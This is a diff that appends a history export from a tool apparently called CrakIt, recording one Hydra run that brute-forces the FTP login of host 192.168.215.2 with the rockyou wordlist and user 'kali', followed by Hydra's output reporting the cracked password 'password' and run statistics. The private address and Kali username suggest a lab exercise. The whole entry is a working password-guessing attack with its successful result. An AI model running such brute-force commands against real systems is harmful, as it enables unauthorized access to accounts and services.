@@ -29,3 +29,34 @@ Successful: 1 (100,0%)
 Failed: 0 (0,0%)
 Average execution time: 4,85s
 ========================================
+========================================
+CRAKIT HISTORY EXPORT
+Generated: 2025-12-03 16:43:32
+Tool: Hydra
+Total Entries: 1
+========================================
+
+[2025-12-03 16:43:31] SUCCESS (4,52s)
+Tool: Hydra
+Command: hydra -l kali -P /usr/share/wordlists/rockyou.txt -t 16 192.168.215.2 ftp
+Output:
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-03 15:43:27
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.215.2:21/
+[21][ftp] host: 192.168.215.2   misc: (null)   login: kali   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-03 15:43:31
+
+------------------------------------------------------------
+
+
+========================================
+STATISTICS
+========================================
+Total commands: 1
+Successful: 1 (100,0%)
+Failed: 0 (0,0%)
+Average execution time: 4,52s
+========================================
